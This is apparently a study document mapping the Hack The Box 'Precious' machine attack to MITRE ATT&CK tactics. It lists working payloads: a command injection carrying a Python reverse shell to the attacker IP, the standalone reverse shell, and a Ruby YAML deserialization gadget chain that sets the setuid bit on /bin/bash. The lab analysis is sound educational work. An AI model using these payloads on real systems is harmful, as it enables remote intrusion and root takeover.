# Cyber4ML_Framework application in "Precious" HTB machine.

## Framework application details

|Documentation|MITRE ATT&CK|Network Analysis|Log Analysis|
|-|-|-|-|
|Yes|Yes|Yes|Yes|

|Attacker Level|Environment|VPN|Attacker IP|Victim IP|
|-|-|-|-|-|
|Average|Linux|Yes|10.10.16.27|10.10.11.189|

## Documentation

Documentation of the attack: [Precious Documentation](https://github.com/stevendamianakis/HackTheBox_Writeups/blob/main/Machines/Precious/README.MD)

## MITRE ATT&CK mapping

Below, we map the attack to the MITRE ATT&CK Enterprise framework.

| Tactic | Technique | Subtechnique | Command |
| - | - | - | - |
| Initial Access | Exploit Public-Facing Application | - | (1) |
| Execution | Exploitation for Client Execution | Unix Shell | (2) |
| Persistence | Valid Accounts | Default Accounts | (3) |
| Privilege Escalation | Exploitation for Privilege Escalation | - | (4) |

#### Commands
- (1)
```
http://%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.27",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`
```
- (2)
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.27",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
- (3)
```
ssh henry@10.10.11.189
```
- (4)
```
 ---
 - !ruby/object:Gem::Installer
     i: x
 - !ruby/object:Gem::SpecFetcher
     i: y
 - !ruby/object:Gem::Requirement
   requirements:
     !ruby/object:Gem::Package::TarReader
     io: &1 !ruby/object:Net::BufferedIO
       io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
       debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
              git_set: "chmod +s /bin/bash"
          method_id: :resolve
```

## Network Analysis

Pcap file of the attack:

## Log Analysis
